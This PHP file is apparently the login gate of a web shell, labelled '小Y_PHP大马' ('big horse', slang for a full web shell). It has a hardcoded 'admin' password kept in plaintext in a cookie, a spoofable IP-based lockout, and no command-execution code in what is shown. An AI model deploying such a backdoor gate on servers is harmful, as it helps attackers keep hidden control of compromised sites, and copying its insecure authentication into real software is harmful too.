<?php
session_start();
error_reporting(7);
define('pass', 'admin');
$op = @$_GET['op'];
$op = $op ? $op : 'home';
$ip = ip();
Bl_ip();
if (empty(@$_SESSION[$ip])) {
    $_SESSION[$ip][] = array(0,time());
}
if (!isset($_COOKIE['passwd'])) {
    if (empty($_POST['passwd'])) login(0);
    if (@$_POST['passwd'] == pass) {
        setcookie('passwd', pass, time() + 3600);
        $_SESSION['timeout'] = time() + 900;
    } elseif ( @$_POST['passwd'] != pass) {
        login(1);
    }
}else{
    if (@$_COOKIE['passwd'] != pass) login(2);
    if($_SESSION['timeout'] < time()){
        setcookie('passwd', '', time() - 3600);
        unset($_SESSION['timeout']);
        login(2);
    }else{
        $_SESSION['timeout'] = time() + 900;
        setcookie('passwd', pass, time() + 3600);
    }
}
function Bl_ip(){
    global $ip;
    if (@$_SESSION['Bl_'.$ip]) {
        if (get_time(time(),$_SESSION['Bl_'.$ip]) < 10){
            login(3);
        }else{
            unset($_SESSION['Bl_' . $ip]);
        }
    }
}
function get_time($end_time,$start_time){
    $end = explode('-',@date('i-s', $end_time));
    $start = explode('-',@date('i-s', $start_time));

    return ($end[0] - $start[0])* 60  + $end[1] - $start[1];

}
function login($err){
    global $ip;
    $file = basename(__FILE__);
    global $_SESSION;
    $errs = array('密码不能为空','密码错误 请重新输入','验证过期 请重新验证','访问频繁 请稍后再试');
    $error = $errs[$err];
    if ($err == 1 or $err == 0) {
        $num = count($_SESSION[$ip]) - 1;
        list($count,$time) = $_SESSION[$ip][$num];
        $count ++;
        $_SESSION[$ip][] = array($count, time());
//        var_dump(get_time($_SESSION[$ip][$num][1],$_SESSION[$ip][0][1]));
        if (get_time($_SESSION[$ip][$num][1],$_SESSION[$ip][0][1]) >= 5) {
            if($_SESSION[$ip][$num][0] - $_SESSION[$ip][0][0] > 4){
                unset($_SESSION[$ip]);
                $_SESSION['Bl_'.$ip] = time();
                $error =  $errs[3];
            }else{
                unset($_SESSION[$ip]);
            }
        }
    }
    echo <<<EOT
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>xyz</title>
</head>
<body style="text-align:center" bgcolor="black">
<p style="color:white">小Y_PHP大马</p>
EOT;
    if ($err !== ''){
        echo<<<EOT
        <span style="color: red;">{$error}</span>
EOT;
    }
echo <<<EOT
<form action="{$file}" method="post">
<span style="color: white;">请输入密码：</span>  <input type="text"  name="passwd" style="text-align:center; " > <input type="submit" name="提交">
</form>
</body>
</html>
EOT;
    exit();
}

function ip() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
}

echo @date('h-i-s', time());
?>
